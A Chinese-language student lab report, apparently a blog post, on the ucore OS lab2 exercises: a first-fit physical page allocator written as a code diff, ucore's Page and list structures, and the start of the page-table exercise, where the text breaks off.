    <title>uCoreOs lab2 实验报告</title>
    <url>/posts/a87e5e21/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
<li>理解基于段页式内存地址的转换机制</li>
<li>理解页表的建立和使用方法</li>
<li>理解物理内存的管理方法<a id="more"></a></li>
</ul>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>本次实验包含三个部分。首先了解如何发现系统中的物理内存；然后了解如何建立对物理内存的初步管理，即了解连续物理内存管理；最后了解页表相关的操作，即如何建立页表来实现虚拟内存到物理内存之间的映射，对段页式内存管理机制有一个比较全面的了解。本实验里面实现的内存管理还是非常基本的，并没有涉及到对实际机器的优化，比如针对 cache 的优化等。如果大家有余力，尝试完成扩展练习。</p>
<h2 id="练习介绍"><a href="#练习介绍" class="headerlink" title="练习介绍"></a>练习介绍</h2><p>为了实现lab2的目标，lab2提供了3个基本练习和2个扩展练习，要求完成实验报告。</p>
<p>对实验报告的要求：</p>
<ul>
<li>基于markdown格式来完成，以文本方式为主</li>
<li>填写各个基本练习中要求完成的报告内容</li>
<li>完成实验后，请分析ucore_lab中提供的参考答案，并请在实验报告中说明你的实现与参考答案的区别</li>
<li>列出你认为本实验中重要的知识点，以及与对应的OS原理中的知识点，并简要说明你对二者的含义，关系，差异等方面的理解（也可能出现实验中的知识点没有对应的原理知识点）</li>
<li>列出你认为OS原理中很重要，但在实验中没有对应上的知识点</li>
</ul>
<p>查看本次实验所有需要填写代码的地方</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ZSH"><figure class="iseeu highlight /zsh"><table><tr><td class="code"><pre><span class="line">[~/Desktop/ucore_lab/labcodes/lab2_new]</span><br><span class="line">moocos-&gt; grep -rn <span class="string">"LAB2 EXERCISE"</span> *</span><br><span class="line">Binary file kern/mm/.default_pmm.c.swp matches</span><br><span class="line">Binary file kern/mm/.default_pmm.c.swo matches</span><br><span class="line">kern/mm/default_pmm.c:12:// LAB2 EXERCISE 1: YOUR CODE</span><br><span class="line">kern/mm/pmm.c:350:    /* LAB2 EXERCISE 2: YOUR CODE</span><br><span class="line">kern/mm/pmm.c:403:    /* LAB2 EXERCISE 3: YOUR CODE</span><br></pre></td></tr></table></figure></div>
<h2 id="练习0：填写已有实验"><a href="#练习0：填写已有实验" class="headerlink" title="练习0：填写已有实验"></a>练习0：填写已有实验</h2><p>本实验依赖实验1。请把你做的实验1的代码填入本实验中代码中有“LAB1”的注释相应部分。提示：可采用diff和patch工具进行半自动的合并（merge），也可用一些图形化的比较/merge工具来手动合并，比如meld，eclipse中的diff/merge工具，understand中的diff/merge工具等。</p>
<p>命令行键入meld</p>
<p>设置lab1，lab2两个文件夹</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200326141422240.png" alt="image-20200326141422240"></p>
<p>比较合并</p>
<p>其实只要将lab1的 kern/debug/kdebug.c , kern/init/init.c,  kern/trap/trap.c复制到lab2即可</p>
<h2 id="练习1：实现-first-fit-连续物理内存分配算法"><a href="#练习1：实现-first-fit-连续物理内存分配算法" class="headerlink" title="练习1：实现 first-fit 连续物理内存分配算法"></a>练习1：实现 first-fit 连续物理内存分配算法</h2><p>在实现first fit 内存分配算法的回收函数时，要考虑地址连续的空闲块之间的合并操作。提示:在建立空闲页块链表时，需要按照空闲页块起始地址来排序，形成一个有序的链表。可能会修改default_pmm.c中的default_init，default_init_memmap，default_alloc_pages， default_free_pages等相关函数。请仔细查看和理解default_pmm.c中的注释。</p>
<p>请在实验报告中简要说明你的设计实现过程。请回答如下问题：</p>
<ul>
<li>你的first fit算法是否有进一步的改进空间</li>
</ul>
<p>先直接运行，出现如下错误</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200327025022905.png" alt="image-20200327025022905"></p>
<p>错误是在</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">assert((p0 = alloc_page()) == p2 - <span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>
<p><strong>最先匹配算法</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200326193613549.png" alt="image-20200326193613549" style="zoom:50%;"></p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200326193625241.png" alt="image-20200326193625241" style="zoom: 50%;"></p>
<p>观察default_pmm.c文件头</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pmm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;default_pmm.h&gt;</span></span></span><br></pre></td></tr></table></figure></div>
<p>查看./pmm.h</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __KERN_MM_PMM_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __KERN_MM_PMM_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;defs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mmu.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memlayout.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;atomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// pmm_manager is a physical memory management class. A special pmm manager - XXX_pmm_manager</span></span><br><span class="line"><span class="comment">// only needs to implement the methods in pmm_manager class, then XXX_pmm_manager can be used</span></span><br><span class="line"><span class="comment">// by ucore to manage the total physical memory space.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pmm_manager</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;                                 <span class="comment">// XXX_pmm_manager's name</span></span><br><span class="line">    <span class="keyword">void</span> (*init)(<span class="keyword">void</span>);                               <span class="comment">// initialize internal description&amp;management data structure</span></span><br><span class="line">                                                      <span class="comment">// (free block list, number of free block) of XXX_pmm_manager</span></span><br><span class="line">    <span class="keyword">void</span> (*init_memmap)(struct Page *base, <span class="keyword">size_t</span> n); <span class="comment">// setup description&amp;management data structcure according to</span></span><br><span class="line">                                                      <span class="comment">// the initial free physical memory space</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *(*<span class="title">alloc_pages</span>)(<span class="title">size_t</span> <span class="title">n</span>);</span>            <span class="comment">// allocate &gt;=n pages, depend on the allocation algorithm</span></span><br><span class="line">    <span class="keyword">void</span> (*free_pages)(struct Page *base, <span class="keyword">size_t</span> n);  <span class="comment">// free &gt;=n pages with "base" addr of Page descriptor structures(memlayout.h)</span></span><br><span class="line">    <span class="keyword">size_t</span> (*nr_free_pages)(<span class="keyword">void</span>);                    <span class="comment">// return the number of free pages</span></span><br><span class="line">    <span class="keyword">void</span> (*check)(<span class="keyword">void</span>);                              <span class="comment">// check the correctness of XXX_pmm_manager</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>pmm_manager是内存分配结构体</p>
<p>包含6个函数指针(的声明)</p>
<p>包含初始化函数init，分配函数alloc_pages，释放函数free_pages，检查函数check。</p>
<p>其定义在./default_pmm.c的末尾</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pmm_manager</span> <span class="title">default_pmm_manager</span> = &#123;</span></span><br><span class="line">    .name = <span class="string">"default_pmm_manager"</span>,</span><br><span class="line">    .init = default_init,</span><br><span class="line">    .init_memmap = default_init_memmap,</span><br><span class="line">    .alloc_pages = default_alloc_pages,</span><br><span class="line">    .free_pages = default_free_pages,</span><br><span class="line">    .nr_free_pages = default_nr_free_pages,</span><br><span class="line">    .check = default_check,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>因此可知在default_pmm.c中要完成对连续内存分配中使用到的各个函数的定义。</p>
<p>引用了库文件memlayout.h</p>
<p>查看./memlayout.h</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * struct Page - Page descriptor structures. Each Page describes one</span></span><br><span class="line"><span class="comment"> * physical page. In kern/mm/pmm.h, you can find lots of useful functions</span></span><br><span class="line"><span class="comment"> * that convert Page to other data types, such as phyical address.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> ref;                        <span class="comment">// page frame's reference counter</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// array of flags that describe the status of the page frame</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property;          <span class="comment">// the num of free block, used in first fit pm manager</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link;         <span class="comment">// free list link</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* Flags describing the status of a page frame */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_reserved                 0       <span class="comment">// if this bit=1: the Page is reserved for kernel, cannot be used in alloc/free_pages; otherwise, this bit=0</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_property                 1       <span class="comment">// if this bit=1: the Page is the head page of a free memory block(contains some continuous_addrress pages), and can be used in alloc_pages; if this bit=0: if the Page is the the head page of a free memory block, then this Page and the memory block is alloced. Or this Page isn't the head page.</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SetPageReserved(page)       set_bit(PG_reserved, &amp;((page)-&gt;flags))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ClearPageReserved(page)     clear_bit(PG_reserved, &amp;((page)-&gt;flags))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PageReserved(page)          test_bit(PG_reserved, &amp;((page)-&gt;flags))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SetPageProperty(page)       set_bit(PG_property, &amp;((page)-&gt;flags))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ClearPageProperty(page)     clear_bit(PG_property, &amp;((page)-&gt;flags))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PageProperty(page)          test_bit(PG_property, &amp;((page)-&gt;flags))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// convert list entry to page</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> le2page(le, member)                 \</span></span><br><span class="line">    to_struct((le), struct Page, member)</span><br></pre></td></tr></table></figure></div>
<p><strong>页面page定义</strong></p>
<ul>
<li>ref<br>表示这样页被页表的引用记数，应该就是映射此物理页的虚拟页个数。一旦某页表中有一个页表项设置了虚拟页到这个Page管理的物理页的映射关系，就会把Page的ref加一。反之，若是解除，那就减一。</li>
<li>flags<br>表示此物理页的状态标记，有两个标志位，第一个表示是否被保留，如果被保留了则设为1（比如内核代码占用的空间）。第二个表示此页是否是free的。如果设置为1，表示这页是free的，可以被分配；如果设置为0，表示这页已经被分配出去了，不能被再二次分配。</li>
<li>property<br>用来记录某连续内存空闲块的大小，这里需要注意的是用到此成员变量的这个Page一定是连续内存块的开始地址（第一页的地址）。</li>
<li>page_link<br>是便于把多个连续内存空闲块链接在一起的<strong>双向链表指针</strong>，连续内存空闲块利用这个页的成员变量page_link来链接比它地址小和大的其他连续内存空闲块，page_link所用的空间实际就是页面空间</li>
</ul>
<p>而页面实际大小为结构体所占的空间大小</p>
<p>有7个宏定义函数</p>
<ul>
<li>SetPageReserved(page) 设置PG_reserved=1，标识的内存是被内核使用的，不能释放</li>
<li>SetPageProperty(page) 设置PG_property=1，表示的可分配的意思，0则表示已被使用</li>
<li>le2page(le, member) 获得以le为地址起点，member为数据（结构）类型所占用字节的的变量。一个地址可能有不同大小的数据类型存在，一个结构体及其内部第一个成员及其嵌套成员的起始地址是相同的</li>
</ul>
<p>查看libs/list.h</p>
<p>包含以下自定义数据结构链表和链表操作函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_entry</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list_entry</span> <span class="title">list_entry_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_init</span><span class="params">(<span class="keyword">list_entry_t</span> *elm)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_add</span><span class="params">(<span class="keyword">list_entry_t</span> *listelm, <span class="keyword">list_entry_t</span> *elm)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_add_before</span><span class="params">(<span class="keyword">list_entry_t</span> *listelm, <span class="keyword">list_entry_t</span> *elm)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_add_after</span><span class="params">(<span class="keyword">list_entry_t</span> *listelm, <span class="keyword">list_entry_t</span> *elm)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del</span><span class="params">(<span class="keyword">list_entry_t</span> *listelm)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del_init</span><span class="params">(<span class="keyword">list_entry_t</span> *listelm)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">list_empty</span><span class="params">(<span class="keyword">list_entry_t</span> *<span class="built_in">list</span>)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> list_entry_t *<span class="title">list_next</span><span class="params">(<span class="keyword">list_entry_t</span> *listelm)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> list_entry_t *<span class="title">list_prev</span><span class="params">(<span class="keyword">list_entry_t</span> *listelm)</span> __<span class="title">attribute__</span><span class="params">((always_inline))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add(<span class="keyword">list_entry_t</span> *elm, <span class="keyword">list_entry_t</span> *prev, <span class="keyword">list_entry_t</span> *next) __attribute__((always_inline));</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del(<span class="keyword">list_entry_t</span> *prev, <span class="keyword">list_entry_t</span> *next) __attribute__((always_inline));</span><br></pre></td></tr></table></figure></div>
<p><strong>练习1实现代码</strong></p>
<p>主要修改代码如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line"> #define free_list (free_area.free_list)</span><br><span class="line"> #define nr_free (free_area.nr_free)</span><br><span class="line"></span><br><span class="line"> static void</span><br><span class="line"> default_init(void) &#123;    //初始化页面分配管理</span><br><span class="line">     list_init(&amp;free_list);  //初始化空闲页面列表</span><br><span class="line">     nr_free = 0;       //初始化空闲页面个数为0</span><br><span class="line"> &#125;</span><br><span class="line"> //下面这个函数根据现有的内存情况构建空闲块列表的初始状态</span><br><span class="line"> //以base为基址，选择n个连续页面</span><br><span class="line"> static void</span><br><span class="line"> default_init_memmap(struct Page *base, size_t n) &#123;</span><br><span class="line">     assert(n &gt; 0);</span><br><span class="line">     struct Page *p = base;</span><br><span class="line">     for (; p != base + n; p ++) &#123;//找到n个页面，并初始化页面各项参数</span><br><span class="line">         assert(PageReserved(p));</span><br><span class="line">         p-&gt;flags = p-&gt;property = 0;</span><br><span class="line">         set_page_ref(p, 0);</span><br><span class="line">     &#125;</span><br><span class="line">     base-&gt;property = n;</span><br><span class="line">     SetPageProperty(base);</span><br><span class="line">     nr_free += n;</span><br><span class="line">     // 将生成的连续n页空闲空间加入空闲列表</span><br><span class="line">     list_add(&amp;free_list, &amp;(base-&gt;page_link));</span><br><span class="line"> &#125;</span><br><span class="line"> //用最先匹配算法分配大小为n页的空间</span><br><span class="line"> static struct Page *</span><br><span class="line"> default_alloc_pages(size_t n) &#123;</span><br><span class="line">     //判断空闲地址空间是否大于所需空间</span><br><span class="line">     assert(n &gt; 0);</span><br><span class="line">     if (n &gt; nr_free) &#123;</span><br><span class="line">         return NULL;</span><br><span class="line">     &#125;</span><br><span class="line">     //从free_list开始，遍历链表，直到找到第一块不小于所需空间大小（n）的内存块，赋值给page</span><br><span class="line">     struct Page *page = NULL;</span><br><span class="line">     list_entry_t *le = &amp;free_list; //le是空闲块链表头指针</span><br><span class="line">     // 查找n个或以上空闲页块，若找到，则判断是否大过n，则将其拆分，并将拆分后的剩下的空闲页块加回到链表中</span><br><span class="line">     while ((le = list_next(le)) != &amp;free_list) &#123; //从第一个节点开始遍历</span><br><span class="line">         // 此处 le2page 就是将 le 的地址 - page_link 在 Page 的偏移 从而找到 Page 的地址</span><br><span class="line">         struct Page *p = le2page(le, page_link); //获取节点所在基于Page数据结构的变量</span><br><span class="line">         if (p-&gt;property &gt;= n) &#123;</span><br><span class="line">             page = p;</span><br><span class="line">             break;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     //如果可以找到长度大于等于n页的块，</span><br><span class="line">     //从链表中删除此内存块</span><br><span class="line">     //如果长度大于n，分配连续的n页，修改标志位，如果有剩余的小的内存块，重新插入链表</span><br><span class="line">     if (page != NULL) &#123;</span><br><span class="line">     //此时空间分布如下</span><br><span class="line">     //(&amp;page)                (&amp;(p=page+n))</span><br><span class="line">     //|&lt;-----------------------page----------------------&gt;|</span><br><span class="line">     //|&lt;---------------------property--------------------&gt;|</span><br><span class="line">     //|&lt;------------n-------------&gt;|&lt;----(property-n)----&gt;|</span><br><span class="line">     //</span><br><span class="line">     //节点添加思路</span><br><span class="line">     //原来    :pre_link&lt;--&gt;page_link</span><br><span class="line">     //添加p   :pre_link&lt;--&gt;page_link&lt;--&gt;p</span><br><span class="line">     //删除page:pre_link&lt;--&gt;p</span><br><span class="line">     //将list_del(&amp;(page-&gt;page_link))后置是因为删除了该节点便会在后续添加p中无法找到前继pre_link</span><br><span class="line">     //亦可用新建一个变量先保存pre_link地址，但这会耗费额外的空间</span><br><span class="line"><span class="deletion">-        list_del(&amp;(page-&gt;page_link));</span></span><br><span class="line">         if (page-&gt;property &gt; n) &#123;</span><br><span class="line">             struct Page *p = page + n;</span><br><span class="line">             p-&gt;property = page-&gt;property - n;</span><br><span class="line"><span class="addition">+            SetPageProperty(p);//设置其为未分配的空闲空间的起始地址</span></span><br><span class="line">             // 将多出来的插入到被分配掉的页块后面</span><br><span class="line"><span class="deletion">-            list_add(&amp;free_list, &amp;(p-&gt;page_link));</span></span><br><span class="line"><span class="addition">+            list_add(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));//连接可分配的空闲区域</span></span><br><span class="line">         &#125;</span><br><span class="line">         // 最后在空闲页链表中删除掉原来的空闲页</span><br><span class="line"><span class="addition">+        list_del(&amp;(page-&gt;page_link));</span></span><br><span class="line">         nr_free -= n;</span><br><span class="line">         ClearPageProperty(page);</span><br><span class="line">     &#125;</span><br><span class="line">     return page;</span><br><span class="line"> &#125;</span><br><span class="line"> //下面函数负责已分配内存的释放，基址为base，大小为n页</span><br><span class="line"> static void</span><br><span class="line"> default_free_pages(struct Page *base, size_t n) &#123;</span><br><span class="line">     assert(n &gt; 0);//断言n&gt;0</span><br><span class="line">     struct Page *p = base;</span><br><span class="line">     for (; p != base + n; p ++) &#123;</span><br><span class="line">         //这两个变量主要就是用来确保页空间能符合释放条件。</span><br><span class="line">         //第一个PG_reserved为1标识的内存是被内核使用的，不能释放；</span><br><span class="line">         //第二个PG_property表示的可分配的意思，如果为1表示以这个页开始存在一片空闲页，</span><br><span class="line">         //这种情况也无需free操作，而且如果存在这种情况说明这个待释放的空间其实是有问题的。</span><br><span class="line">         //所以只有这两个标志位都为0，才能释放这个页。</span><br><span class="line">         assert(!PageReserved(p) &amp;&amp; !PageProperty(p));</span><br><span class="line">         p-&gt;flags = 0;</span><br><span class="line">         set_page_ref(p, 0);//页面引用次数置0</span><br><span class="line">     &#125;</span><br><span class="line">     base-&gt;property = n;</span><br><span class="line">     SetPageProperty(base);</span><br><span class="line">     //找到链表中应该插入的位置并插入</span><br><span class="line">     //判断此块空余空间能否与前后空余空间合并，如果可以将其合并</span><br><span class="line">     list_entry_t *le = list_next(&amp;free_list);//下一个空闲页</span><br><span class="line">     while (le != &amp;free_list) &#123;//循环地在空闲页列表中进行查找，回到起点则退出</span><br><span class="line">         p = le2page(le, page_link);</span><br><span class="line">         le = list_next(le);</span><br><span class="line">         if (base + base-&gt;property == p) &#123;//后面的地址可以合并</span><br><span class="line">             base-&gt;property += p-&gt;property;</span><br><span class="line">             ClearPageProperty(p);</span><br><span class="line">             list_del(&amp;(p-&gt;page_link));//消除中间节点</span><br><span class="line">         &#125;</span><br><span class="line">         else if (p + p-&gt;property == base) &#123;//前面的地址可以合并</span><br><span class="line">             p-&gt;property += base-&gt;property;</span><br><span class="line">             ClearPageProperty(base);</span><br><span class="line">             base = p;</span><br><span class="line">             list_del(&amp;(p-&gt;page_link));</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     nr_free += n;//空闲页面数+n</span><br><span class="line">     // 将合并好的合适的页块添加回空闲页块链表</span><br><span class="line">     // 找到适合位置时,le刚好在base的后面</span><br><span class="line"><span class="addition">+    le = list_next(&amp;free_list);</span></span><br><span class="line"><span class="addition">+    while (le != &amp;free_list) &#123;</span></span><br><span class="line"><span class="addition">+        p = le2page(le, page_link);</span></span><br><span class="line"><span class="addition">+        if (base + base-&gt;property &lt;= p) &#123;</span></span><br><span class="line"><span class="addition">+            break;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+        le = list_next(le);</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="deletion">-    list_add(&amp;free_list, &amp;(base-&gt;page_link));</span></span><br><span class="line"><span class="addition">+    list_add_before(le, &amp;(base-&gt;page_link));</span></span><br><span class="line">     //也可以用list_add(list_prev(le),&amp;(base-&gt;page_link));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>
<p>运行结果</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200327035458593.png" alt="image-20200327035458593"></p>
<p>可以看到分配函数alloc_page()测试成功，且出现了新的错误，需要等到练习2解决</p>
<blockquote>
<p>Q:你的first fit算法是否有进一步的改进空间</p>
</blockquote>
<p>可以看出，page_link数据结构用的是线性结构链表，程序运行时间主要花在查找方面（循环查找符合条件的节点），算法时间复杂度为$O(n)$，改进方面可以使用非线性结构（例如线段树）来存储页面空间，提高查找效率，使用二分查找的话可以使时间复杂度降至 $O(log_{2}n)$</p>
<h2 id="练习2：实现寻找虚拟地址对应的页表项"><a href="#练习2：实现寻找虚拟地址对应的页表项" class="headerlink" title="练习2：实现寻找虚拟地址对应的页表项"></a>练习2：实现寻找虚拟地址对应的页表项</h2><p>通过设置页表和对应的页表项，可建立虚拟内存地址和物理内存地址的对应关系。其中的get_pte函数是设置页表项环节中的一个重要步骤。此函数找到一个虚地址对应的二级页表项的内核虚地址，如果此二级页表项不存在，则分配一个包含此项的二级页表。本练习需要补全get_pte函数 in kern/mm/pmm.c，实现其功能。请仔细查看和理解get_pte函数中的注释。get_pte函数的调用关系图如下所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image001.png" alt="img"> 图1 get_pte函数的调用关系图</p>
<p>请在实验报告中简要说明你的设计实现过程。请回答如下问题：</p>
<ul>
<li>请描述页目录项（Page Directory Entry）和页表项（Page Table Entry）中每个组成部分的含义以及对ucore而言的潜在用处。</li>
<li>如果ucore执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？</li>
</ul>
<p><strong>段页式机制</strong></p>
<p><img src="/images/loading.gif" data-original="/posts/a87e5e21/image-20200327230020872.png" alt="image-20200327230020872" style="zoom: 80%;"></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>页目录索引表（PDT）</td>
<td>一级索引</td>
</tr>
<tr>
<td>页表索引表（PTT）</td>
<td>二级索引</td>
</tr>
<tr>
<td>页表项（PTE）</td>
<td>页表项 PDT（1024项PDE），PTT（1024项PTE）</td>
</tr>
</tbody>
</table>
</div>
<script type="math/tex; mode=display">虚拟地址映射关系：虚拟=物理+0xC0000000</script><p>pmm.h中有下列的宏定义函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分配1页空间</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> alloc_page() alloc_pages(1) </span></span><br><span class="line"><span class="comment">//释放1页空间</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> free_page(page) free_pages(page, 1)  </span></span><br><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * PADDR - takes a kernel virtual address (an address that points above KERNBASE),</span></span><br><span class="line"><span class="comment"> * where the machine's maximum 256MB of physical memory is mapped and returns the</span></span><br><span class="line"><span class="comment"> * corresponding physical address.  It panics if you pass it a non-kernel virtual address.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="comment">//将内核虚地址转化为物理地址，若非内核虚地址会报错</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PADDR(kva) (&#123;                                                   \</span></span><br><span class="line">            <span class="keyword">uintptr_t</span> __m_kva = (<span class="keyword">uintptr_t</span>)(kva);                       \</span><br><span class="line">            <span class="keyword">if</span> (__m_kva &lt; KERNBASE) &#123;                                   \</span><br><span class="line">                panic(<span class="string">"PADDR called with invalid kva %08lx"</span>, __m_kva);  \</span><br><span class="line">            &#125;                                                           \</span><br><span class="line">            __m_kva - KERNBASE;                                         \</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * KADDR - takes a physical address and returns the corresponding kernel virtual</span></span><br><span class="line"><span class="comment"> * address. It panics if you pass an invalid physical address.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="comment">//将物理地址转化为内核虚地址，若非物理地址会报错，对la所在的二级页表的物理地址进行虚拟化</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KADDR(pa) (&#123;                                                    \</span></span><br><span class="line">            <span class="keyword">uintptr_t</span> __m_pa = (pa);                                    \</span><br><span class="line">            <span class="keyword">size_t</span> __m_ppn = PPN(__m_pa);                               \</span><br><span class="line">            <span class="keyword">if</span> (__m_ppn &gt;= npage) &#123;                                     \</span><br><span class="line">                panic(<span class="string">"KADDR called with invalid pa %08lx"</span>, __m_pa);    \</span><br><span class="line">            &#125;                                                           \</span><br><span class="line">            (<span class="keyword">void</span> *) (__m_pa + KERNBASE);                               \</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="comment">//对页表项进行4K对齐(截断低12位,低十二位变为0，高位不变)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_ADDR(pte)   ((uintptr_t)(pte) &amp; ~0xFFF)   </span></span><br><span class="line"><span class="comment">//对页目录项进行4K对齐(截断低12位)</span></span><br><span 